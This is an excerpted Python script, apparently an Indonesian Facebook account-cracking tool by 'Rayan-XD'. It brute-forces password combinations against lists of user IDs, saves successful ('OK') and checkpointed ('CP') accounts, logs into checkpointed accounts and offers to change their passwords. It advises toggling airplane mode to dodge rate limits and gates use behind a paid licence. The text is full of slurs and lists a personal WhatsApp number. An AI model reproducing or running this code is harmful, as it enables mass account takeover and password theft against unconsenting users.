...
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36"}
...
##############################
 # USER AGENT #
ugen2=['Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36']
ugen=['Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36']
...
\033[1;92m╔══o00════════00o════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m Rayan-XD     \033[1;31;1m   █      
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m +6285852768706 \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m  +6285852768706 \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGorup Wa  :  \033[1;92m Hubungi Admin \033[1;31;1m        █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :\033[1;92m   6.0.0          \033[1;31;1m █
\033[1;92m╚════════════════════════════════════╝""")
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By Rayan-XD...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        print(f' %s[%s+%s] Jumlah Akun OK : %s%s%s'%(H,H,H,H,str(len(ok)),H))
        print(f' [%s+%s] Jumlah Akun CP : %s%s%s'%(H,H,H,str(len(cp)),H))
        cek_cp = input(f"{H}══════════════════════════════════════════\n [{H}+{H}] Show CP detector options [{H}Y{N}/{M}t{N}]: ")
        if cek_cp =="":
            print(f"\n [{M}!{N}] Jangan Kosong Ngntd");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" {N}[{M}!{N}] Nyalakan Mode Pesawat");time.sleep(5)
            ww=input(f"\n {N}[{K}?{N}] Ubah Kata Sandi Ketika {BM}TAP CROTTTT{N} [{H}Y{N}/{M}t{N}]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] CONTOH KATA SANDI : {H}Rayan-XDGANTENG:V{N}")
                pwBar=input(f" {N}[{K}?{N}] Enter new password : {H}")
                #print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] Password minimal 6 characters'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Akun : {K}{kontol.replace("[Rayan-XD-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[Rayan-XD-CP] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                    print("")
            print("")
            jalan(' %s[%s✓%s] %sProses Pengecekan Selesai%s'%(N,H,N,H,N))
            jalan(' %s[%s✓%s] Jalankan Ulang "%sKontol%s"'%(N,H,N,H,N));exit()
        elif cek_cp in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Jalankan Ulang '{H}Kontol{N}'");exit()
        else:
            print(f"\n {N}[{M}!{N}] Pilih Y/t");hasil(ok,cp)
    else:
        jalan('\n\n %s[%s!%s] Ga Ada Hasil Jangan Nangis Ngntd'%(N,M,N));exit()
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        print(f'\r %s[%s!%s] %sTidak Ada Apk Aktif%s  '%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sDetail Aplikasi Aktif Akun Anda :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Apk Gagal Memeriksa Cookie Tidak Valid'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sTidak Ada Apk Yg Kedalewarsa%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sDetail Aplikasi Aktif Akun Anda :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Apk Gagal Memeriksa Cookie Tidak Valid\n'%(N,M,N))
#METODE LOGIN
### MENU UTAMA ###
def file():
            os.system("clear")
...
class __chigoue__:
    ...
    def chi(self, id):
        ...
        if crot in[""]:
            ...
            #jalan(f" {N}[{M}×{N}] Nama Pengguna Salah");self.tampilkan_apk()
            print(f" {H}[{H}×{H}] Pilih y/t");__chigoue__().chi(id)
        self.cnt = input('\033[1;92m[+] Masukan Nama File :\033[1;92m ')
...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[Rayan-XD]","\x1b[1;92m[Rayan-XD]","\x1b[1;92m[Rayan-XD]","\x1b[1;92m[Rayan-XD]","\x1b[1;92m[Rayan-XD]","\x1b[1;92m[Rayan-XD]","\x1b[1;92m[Rayan-XD]"])
    ...
    def __pler__(self):
        ...
        print ('[2] Method 2')
        print ('[3] Method 3')
        yan = input('\n%s[%s+%s] Pilih Metode : '%(H,H,H))
        if yan == '':
            print('\n %s[%s×%s] Salah...!'%(N,M,N));self.__pler__()
        elif yan in ('1', '01'):
    ...
    def kombinasi_pw(self,url):
        ...
        if pw in[""]:
            ...
            print('%s═════════════════════════════════════\n[%s+%s] OK : results/OK-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
            print('%s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
            print('%s══════════════════════════════════════\n[%s!%s] Nyalakan Mode Pesawat Setiap\n[%s!%s] 500 ID\n[%s!%s] To stop %sCTRL+c%s on keyboard\n═══════════════════════════════════════'%(H,H,H,H,H,H,H,H,H))
            with Rayan-XDganteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('|')
                       xz = name.split(' ')
...
def alok():
    try:
        ...
        os.system("clear")
        logo()
        print(' [%s!%s] Hubungi admin jika ingin membeli\n Lisensi atau ingin memperpanjang Lisensi %sMURAH SAYANG%s'%(M,N,H,N))
        print('\n %s%sMenu Tools%s'%(BM,P,N))
        print(' [%s1%s] Login Ke Tools'%(H,N))
        print(' [%s2%s] Hubungi Admin'%(H,N))
        pil = input('\n %s[%s?%s] Choice : '%(N,K,N))
        if pil =="":
            jalan(f" {N}[{M}×{N}] Salah Kontol...!");time.sleep(1);alok()
        elif pil in["2","02"]:
            jalan("\n %s[%s•%s] %sANDA AKAN DI ARAHKAN KE WHATSAPP ADMIN..."%(N,H,N,H));time.sleep(0.02)
            os.system('xdg-open https://wa.me/6285852768706?text=Hallo+admin+pengen beli+lisensinya+dong');time.sleep(2);alok()
        elif pil in["1","01"]:
            print('%s══════════════════════════════════════════'%(N))
            print(' %s[%s!%s] Masukan %sUsername & Password%s Untuk Masuk ke tools!'%(N,M,N,H,N))
        else:
            exit(f"{N}[{M}×{N}] Salah Kontol...!")
        pw = input("\n %s[%s?%s] Enter Username : %s"%(N,K,N,H))
        loading()
        if pw in [""]:
            jalan(" %s[%s!%s] Jangan Di Kosongin kontol!"%(N,M,N));time.sleep(1);alok()
        elif pw in user:
            jalan(" %s[%s✓%s] Sukses Nama Pengguna Benar"%(N,H,N));time.sleep(1);kska()
        else:
            jalan(" %s[%s!%s] Nama Pengguna Salah"%(N,M,N));time.sleep(1);alok()
    file()
def kska():
    ...
    if xx in[""]:
        ...
        jalan(" %s[%s✓%s] Kata Sandi Benar"%(N,H,N));time.sleep(2);open(".ini_pw.txt", "a").write(xx);file()
    else:
        jalan(" %s[%s!%s] Kata Sandi Salah"%(N,M,N));time.sleep(1);alok()   
